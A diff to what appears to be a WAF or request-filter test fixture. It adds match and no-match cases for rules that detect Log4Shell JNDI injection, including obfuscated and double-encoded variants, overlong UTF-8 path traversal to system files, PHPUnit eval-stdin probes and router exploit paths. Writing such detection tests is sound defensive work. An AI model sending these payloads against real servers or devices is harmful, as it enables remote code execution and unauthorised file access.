@@ -446,3 +446,65 @@ no_match = [
   "/wp-content/uploads/a.jpg",
   "/wp-json/wp/v2/posts",
 ]
+
+[cmdi-jndi-lookup]
+match = [
+  "/?x=${jndi:ldap://203.0.113.5/a}",
+  "/?x=${${lower:j}ndi:ldap://203.0.113.5/a}",
+  "/?x=%24%7Bjndi%3Armi%3A%2F%2F203.0.113.5%2Fa%7D",
+  "/?x=%2524%257Bjndi%253Adns%253A%252F%252F203.0.113.5%257D",
+  "/?x=${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.5/a}",
+  "/?x=${j${lower:n}di:ldap://203.0.113.5/a}",
+  "/api?name=${ jndi : ldap://203.0.113.5/a}",
+]
+no_match = [
+  "/search?q=jndi",
+  "/docs/jndi-tutorial",
+  "/cdn/${version}/app.js",
+  "/?tpl=${name}&x=${a}${b}:${c}",
+  "/?q=${jndi",
+  "/?price=${5}",
+]
+
+[traversal-overlong-utf8]
+match = [
+  "/..%c0%af..%c0%afetc/passwd",
+  "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+  "/..%c1%9c..%c1%9cwindows/win.ini",
+  "/scripts/..%c0%af../winnt/system32/cmd.exe",
+  "/..%c0%afetc/passwd",
+]
+no_match = [
+  "/files/caf%e9.pdf",
+  "/s?q=%e9%e8%e7%e6",
+  "/a..%e9b",
+  "/report..final.pdf",
+  "/s?q=na%c3%afve",
+]
+
+[probe-phpunit-eval]
+match = [
+  "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+  "/phpunit/src/util/php/eval-stdin.php?x=1",
+  "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+]
+no_match = [
+  "/docs/phpunit/intro",
+  "/blog/phpunit-tips.php",
+  "/eval-stdin.php",
+  "/tests/phpunit.xml",
+]
+
+[probe-router-exploit]
+match = [
+  "/boaform/admin/formLogin",
+  "/boaform/admin/formLogin?username=admin&psd=admin",
+  "/GponForm/diag_Form?images/",
+  "/HNAP1/",
+]
+no_match = [
+  "/blog/boaform",
+  "/hnap",
+  "/gpon-review",
+  "/products/boaform-guide.html",
+]
